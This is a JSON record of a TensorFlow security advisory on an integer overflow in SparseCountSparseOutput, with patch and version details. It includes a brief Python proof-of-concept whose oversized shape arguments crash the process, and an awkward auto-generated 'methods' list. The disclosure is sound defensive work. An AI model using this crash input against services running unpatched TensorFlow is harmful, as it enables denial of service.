{"description": "### Impact \nThe [implementation of `SparseCountSparseOutput`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/count_ops.cc#L168-L273) can be made to crash a TensorFlow process by an integer overflow whose result is then used in a memory allocation:\n\n```python\nimport tensorflow as tf\nimport numpy as np\n    \ntf.raw_ops.SparseCountSparseOutput(\n  indices=[[1,1]],\n  values=[2],\n  dense_shape=[2 ** 31, 2 ** 32],\n  weights=[1],\n  binary_output=True,\n  minlength=-1,\n  maxlength=-1,\n  name=None)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [6f4d3e8139ec724dbbcb40505891c81dd1052c4a](https://github.com/tensorflow/tensorflow/commit/6f4d3e8139ec724dbbcb40505891c81dd1052c4a).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.", "methods": ["Integer overflow leading to crash in Tensorflow.", "Used a GitHub commit to patch the issue.", "Used a specific commit hash to track the patch (6f4d3e8139ec724dbbcb40505891c81dd1052c4a).", "Used a specific version of TensorFlow to include the patch (TensorFlow 2.8.0).", "Cherrypicked the patch for other affected versions (TensorFlow 2.7.1, TensorFlow 2.6.3, TensorFlow 2.5.3).", "Used a security guide for more information (https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md).", "Used a contact method for issues and questions (https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md)."]}
